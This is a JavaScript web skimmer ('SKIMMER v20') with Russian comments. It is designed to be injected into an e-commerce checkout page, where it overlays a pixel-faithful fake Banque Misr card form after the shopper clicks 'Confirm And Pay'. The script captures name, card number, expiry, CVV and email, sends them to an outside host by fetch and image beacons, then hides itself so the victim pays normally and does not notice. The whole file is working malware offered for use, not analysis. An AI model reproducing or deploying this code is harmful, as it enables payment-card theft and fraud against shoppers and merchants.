/**
 * SKIMMER v20 — точный клон BanqueMisr checkout (по реалу).
 * АРХИТЕКТУРА: НЕ блокируем их клик (preventDefault УБРАН) — их окно открывается
 * как обычно, наша форма рисуется ПОВЕРХ; после Pay убираем форму → юзер видит
 * их живое окно и платит в нём (оно уже открыто, ничего не ломается).
 * ВИД: точная копия оригинала (таймер, Customer info, MM/YY одно поле, ?, логотипы).
 */
(function () {
  'use strict';
  if (window.__SK_CK_RUN) return;
  window.__SK_CK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v20';

  if (location.pathname.indexOf('checkout') === -1) return;

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }
  function log(m) {
    try {
      var img = new Image();
      img.src = HOOK + '?tag=' + TAG + '&m=' + encodeURIComponent(String(m).slice(0, 100));
    } catch (e) {}
  }

  var INJECTED = false;

  /* Чистим ТОЛЬКО глючную terms-модалку (id==termsModal и есть кнопка Accept/Decline).
     Платёжную модалку НЕ трогаем никогда. Во время нашей формы — пауза. */
  function cleanupTheirModals() {
    try {
      if (INJECTED) return;
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        if (m.id === 'skCardModalWrap' || m.id === 'skCardModal') return;
        var id = (m.id || '').toLowerCase();
        var cls = (m.className || '').toString();
        // строго по имени модалки правил
        var isTerms = /terms/.test(id) || /terms/i.test(cls);
        if (!isTerms) return;
        // и внутри есть кнопки Accept/Decline/I Agree (признак модалки правил)
        var btns = (m.innerText || '');
        if (!/accept|decline|i agree|agree/i.test(btns)) return;
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        var bd = document.querySelector('.modal-backdrop');
        if (bd) bd.remove();
        document.body.classList.remove('modal-open');
      });
    } catch (e) {}
  }
  setInterval(cleanupTheirModals, 900);

  /* ---- локализация как у оригинальной формы ---- */
  function detectLang() {
    try {
      var t = '';
      var el = document.querySelector('.payment-option__credit-debit-text');
      if (el) t = el.innerText;
      if (/(Kredit|Kreditkarte)/i.test(t)) return 'de';
      if (/(carte|crédit)/i.test(t)) return 'fr';
      if (t.toLowerCase().indexOf('credit') >= 0) return 'en';
      var bodyTxt = (document.body.innerText || '');
      if (/payer/i.test(bodyTxt)) return 'fr';
      if (/zahlen/i.test(bodyTxt)) return 'de';
      return 'en';
    } catch (e) { return 'en'; }
  }

  var L = {
    en: {
      timer: 'Minutes remaining for this payment : ',
      custInfo: 'Customer information',
      emailLabel: 'E-mail address',
      cardTitle: 'Credit or Debit Card',
      nameLabel: 'Name on card ',
      nameSub: '(exactly as shown on card)',
      numLabel: 'Card number',
      expLabel: 'Expiry date',
      secLabel: 'Security code',
      pay: 'Pay'
    },
    fr: {
      timer: 'Minutes restantes pour ce paiement : ',
      custInfo: 'Informations sur le client',
      emailLabel: 'Adresse e-mail',
      cardTitle: 'Carte de crédit ou de débit',
      nameLabel: 'Nom du titulaire de la carte ',
      nameSub: '(tel qu\'indiqué sur la carte)',
      numLabel: 'Numéro de carte',
      expLabel: 'Date d\'expiration',
      secLabel: 'Code de sécurité',
      pay: 'Payer'
    },
    de: {
      timer: 'Verbleibende Minuten für diese Zahlung : ',
      custInfo: 'Kundeninformationen',
      emailLabel: 'E-Mail-Adresse',
      cardTitle: 'Kredit- oder Debitkarte',
      nameLabel: 'Name des Karteninhabers ',
      nameSub: '(genau wie auf der Karte)',
      numLabel: 'Kartennummer',
      expLabel: 'Ablaufdatum',
      secLabel: 'Prüfnummer',
      pay: 'Zahlen'
    }
  };
  var lang = detectLang();
  var T = L[lang] || L.en;

  function findEmail() {
    try {
      // 1) из их модалки оплаты (открывается после Confirm And Pay)
      var modals = document.querySelectorAll('.modal, .modal-section, [id*="pay"], [id*="checkout"]');
      for (var i = 0; i < modals.length; i++) {
        var t = (modals[i].innerText || '');
        var m = t.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
        if (m) return m[0];
      }
      // 2) из текста любого видимого незакрытого элемента
      var m2 = (document.body.innerText || '').match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
      if (m2) return m2[0];
    } catch (e) {}
    return '';
  }

  /* ---- сумма в формате оригинала (конвертация 525.00 → 525,00) ---- */
  function findAmount() {
    try {
      var txt = (document.body.innerText || '');
      var m = txt.match(/EGP\s*([\d.,]+)/i);
      var raw = m ? m[1] : '';
      var clean = raw.replace(/,/g, '').replace(/\.(?=\d{2}$)/, ',');
      if (raw) return clean;
      var m2 = txt.match(/Total\s*([\d.,]+)/i);
      if (m2) return m2[1].replace(/,/g, '').replace(/\.(?=\d{2}$)/, ',');
      return '525.00';
    } catch (e) { return '525.00'; }
  }

  /* ---- SVG иконки как в оригинале ---- */
  var iconClock = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#4c7a34" stroke-width="2"/><path d="M12 7v5l3 2" stroke="#4c7a34" stroke-width="2" stroke-linecap="round"/></svg>';
  var iconMastercard = '<svg width="38" height="24" viewBox="0 0 38 24"><rect x="1" y="1" width="36" height="22" rx="3" fill="#fff" stroke="#ddd"/><circle cx="15" cy="12" r="7" fill="#eb001b"/><circle cx="24" cy="12" r="7" fill="#f79e1b" fill-opacity=".92"/><circle cx="19.5" cy="12" r="7" fill="none" stroke="#ff5f00" stroke-width="0"/></svg>';
  var iconVisa = '<svg width="38" height="24" viewBox="0 0 38 24"><rect x="1" y="1" width="36" height="22" rx="3" fill="#1a1f71"/><text x="19" y="16" font-family="Arial" font-size="9" font-weight="bold" fill="#fff" text-anchor="middle" font-style="italic">VISA</text></svg>';
  var iconLock = '<svg width="16" height="18" viewBox="0 0 16 20" fill="none"><rect x="1" y="8" width="14" height="11" rx="2" fill="#333"/><path d="M4 8V6a4 4 0 1 1 8 0v2" stroke="#333" stroke-width="2" fill="none"/></svg>';
  var iconCard = '<svg width="22" height="16" viewBox="0 0 22 16" fill="none"><rect x="1" y="1" width="20" height="14" rx="2" stroke="#333" stroke-width="1.6"/><rect x="1" y="4.5" width="20" height="3.2" fill="#333"/><rect x="3" y="10.5" width="6" height="2" fill="#333"/></svg>';
  var iconQ = '<svg width="17" height="17" viewBox="0 0 17 17"><circle cx="8.5" cy="8.5" r="8" fill="#555"/><text x="8.5" y="12" font-family="Arial" font-size="10" font-weight="bold" fill="#fff" text-anchor="middle">?</text></svg>';

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;
    log('inject-start');

    try {
      /* Закрыть ВСЕ их модалки (Session Failed, terms и т.п.) + все backdrop'ы.
         Это разблокирует ввод: их оверлей больше не перехватывает клики. */
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        if (m.id === 'skCardModal' || m.id === 'skCardModalWrap') return;
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
      });
      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
      document.body.classList.remove('modal-open');
      document.body.style.overflow = '';
      document.body.style.paddingRight = '';
      // снять pointer-events-блокировки
      document.querySelectorAll('[style*="pointer-events: none"], [style*="pointer-events:none"]').forEach(function (el) {
        el.style.pointerEvents = '';
      });
    } catch (e) {}

    try {
      var email = findEmail();
      var amount = findAmount();

      var wrap = document.createElement('div');
      wrap.id = 'skCardModalWrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;';

      var bd = document.createElement('div');
      bd.id = 'skBackdrop';
      bd.style.cssText = 'position:absolute;inset:0;background:rgba(255,255,255,.55);';
      wrap.appendChild(bd);

      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.style.cssText = 'position:relative;background:#fff;border-radius:6px;box-shadow:0 12px 60px rgba(0,0,0,.35);padding:22px 26px 26px;width:472px;max-width:96vw;box-sizing:border-box;color:#212529;font-size:15px;line-height:1.5;max-height:calc(100vh - 40px);overflow-y:auto;overflow-x:hidden;';

      var fldWrap = 'position:relative;margin-bottom:14px;';
      var inpStyle = 'width:100%;box-sizing:border-box;padding:10px 12px;height:44px;border:1px solid #ddd;border-radius:4px;font-size:15px;color:#212529;background:#fff;outline:none;font-family:inherit;';
      var lblStyle = 'font-size:15px;font-weight:700;color:#111;margin-bottom:6px;display:block;';
      var reqStar = '<span style="color:#c00;">*</span>';

      var dEl = document.createElement('div');
      dEl.innerHTML =
        // крестик закрытия
        '<div onclick="(function(){var w=document.getElementById(\'skCardModalWrap\');if(w)w.remove();window.__SK_INJECTED_STATE=null;})()" ' +
        'style="position:absolute;top:16px;right:18px;cursor:pointer;color:#555;font-size:22px;line-height:1;user-select:none;">\u00d7</div>' +

        // блок таймера
        '<div style="display:flex;align-items:center;gap:12px;background:#f8f8f8;border-radius:6px;padding:12px 16px;margin:8px 0 20px;color:#333;font-size:15px;">' +
        '  <span>' + iconClock + '</span>' +
        '  <span>' + T.timer + '<span id="skTimer">14:48</span></span>' +
        '</div>' +

        // Customer information
        '<div style="font-size:19px;color:#1a1a1a;margin:0 0 12px;">' + T.custInfo + '</div>' +
        '<div style="border:1px solid #e6e6e6;border-radius:4px;background:#fafafa;padding:12px 14px;margin-bottom:26px;">' +
        '  <div style="font-size:14px;color:#444;margin-bottom:4px;">' + T.emailLabel + '</div>' +
        '  <div style="font-size:16px;color:#111;">' + (email || '') + '</div>' +
        '</div>' +

        // Card title + логотипы
        '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;">' +
        '  <div style="font-size:17px;color:#1a1a1a;">' + T.cardTitle + '</div>' +
        '  <div style="display:flex;gap:4px;align-items:center;">' + iconMastercard + iconVisa + '</div>' +
        '</div>' +

        // Name on card
        '<div style="' + fldWrap + '">' +
        '  <label style="' + lblStyle + '">' + T.nameLabel + ' ' + reqStar + '</label>' +
        '  <span style="font-size:15px;color:#111;">' + T.nameSub + '</span>' +
        '  <input id="skName" autocomplete="off" style="' + inpStyle + '">' +
        '</div>' +

        // Card number
        '<div style="' + fldWrap + '">' +
        '  <label style="' + lblStyle + '">' + T.numLabel + ' ' + reqStar + '</label>' +
        '  <div style="position:relative;">' +
        '    <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" style="' + inpStyle + 'padding-right:44px;">' +
        '    <span style="position:absolute;right:14px;top:50%;transform:translateY(-50%);opacity:.85;">' + iconLock + '</span>' +
        '  </div>' +
        '</div>' +

        // Expiry — ОДНО поле MM / YY
        '<div style="' + fldWrap + '">' +
        '  <label style="' + lblStyle + '">' + T.expLabel + ' ' + reqStar + '</label>' +
        '  <input id="skExp" autocomplete="off" inputmode="numeric" placeholder="MM / YY" maxlength="7" style="' + inpStyle + '">' +
        '</div>' +

        // Security code + ?
        '<div style="' + fldWrap + '">' +
        '  <label style="' + lblStyle + '">' + T.secLabel + ' ' + reqStar +
        '  <span style="vertical-align:-3px;margin-left:2px;display:inline-block;">' + iconQ + '</span></label>' +
        '  <div style="position:relative;">' +
        '    <input id="skCvv" autocomplete="off" inputmode="numeric" maxlength="4" style="' + inpStyle + 'padding-right:48px;">' +
        '    <span style="position:absolute;right:14px;top:50%;transform:translateY(-50%);opacity:.6;">' + iconCard + '</span>' +
        '  </div>' +
        '</div>' +

        // кнопка Payer (светлая, как оригинал)
        '<button id="skPayBtn" style="width:100%;padding:13px;background:#f2f3f5;color:#6b7280;border:none;border-radius:4px;' +
        'font-size:16px;font-weight:400;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:9px;">' +
        '  <span style="display:inline-flex;align-items:center;">' + iconLock + '</span>' +
        '  <span>' + T.pay + ' ' + amount + '</span>' +
        '</button>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:8px;min-height:16px;"></div>';
      d.appendChild(dEl);
      wrap.appendChild(d);
      document.body.appendChild(wrap);

      log('rendered:' + lang);

      var name = dEl.querySelector('#skName'), num = dEl.querySelector('#skNum'),
          exp = dEl.querySelector('#skExp'), cvv = dEl.querySelector('#skCvv'),
          btn = dEl.querySelector('#skPayBtn'), status = dEl.querySelector('#skStatus');

      // таймер тикает с 14:48 (как оригинал)
      var tt = 14 * 60 + 48;
      setInterval(function () {
        try {
          tt = tt > 0 ? tt - 1 : tt;
          var el = document.getElementById('skTimer');
          if (el) el.innerText = Math.floor(tt / 60) + ':' + ('0' + (tt % 60)).slice(-2);
        } catch (e) {}
      }, 1000);

      [name, num, exp, cvv].forEach(function (i) {
        i.addEventListener('focus', function () { i.style.border = '2px solid #1a73e8'; });
        i.addEventListener('blur', function () { i.style.border = '1px solid #ddd'; });
      });

      // форматирование MM / YY
      exp.addEventListener('input', function () {
        var v = exp.value.replace(/[^\d]/g, '').slice(0, 4);
        if (v.length > 2) v = v.slice(0, 2) + ' / ' + v.slice(2);
        exp.value = v;
      });
      // форматирование номера карты
      num.addEventListener('input', function () {
        var v = num.value.replace(/\D/g, '').slice(0, 16);
        num.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      });

      btn.addEventListener('click', function () {
        if (!num.value.trim() || !exp.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        var ep = exp.value.replace(/\s/g, '').split('/');
        send({
          tag: TAG,
          url: location.href,
          email: email,
          full_name: name.value.trim(),
          card_number: num.value.replace(/\s/g, ''),
          expiry: (ep[0] || '') + '/' + (ep[1] || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          amount: amount,
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        status.style.color = '#6b7280';
        btn.disabled = true;
        // 1.6 сек → убираем НАШУ форму; их родное окно уже открыто под нами — юзер платит там
        setTimeout(function () {
          try {
            var w = document.getElementById('skCardModalWrap');
            if (w) w.remove();
            INJECTED = false;
            log('released-payment-form');
          } catch (e) {}
        }, 1600);
      });

      // Esc — убрать нашу форму (их окно остаётся)
      var escHandler = function (ev) {
        if (ev.key === 'Escape') {
          var w = document.getElementById('skCardModalWrap');
          if (w) w.remove();
          INJECTED = false;
          document.removeEventListener('keydown', escHandler);
        }
      };
      document.addEventListener('keydown', escHandler, true);
    } catch (e) { log('inject-err:' + e.message); }
  }

  var lastClick = 0;

  /* Хук: клик по кнопке Confirm And Pay — НЕ блокируем, а показываем форму поверх */
  function hookConfirmPay() {
    document.addEventListener('click', function (ev) {
      if (INJECTED) return;
      var el = ev.target;
      if (el && el.closest) {
        var btnEl = el.closest('button, a');
        if (!btnEl) return;
        var txt = (btnEl.innerText || '').trim().replace(/\s+/g, ' ');
        if (/^confirm\s*(&|and)\s*pay$/i.test(txt)) {
          log('hook-hit');
          var now = Date.now();
          if (now - lastClick < 2500) return;
          lastClick = now;
          // НЕ preventDefault — их флоу идёт как обычно.
          // Ждём 600мс: их окно оплаты начнёт рендериться (заодно достанем email),
          // затем рисуем нашу форму ПОВЕРХ.
          setTimeout(injectForm, 600);
        }
      }
    }, true);
    log('hook-installed');
  }

  try { hookConfirmPay(); } catch (e) { log('hook-err:' + e.message); }
})();
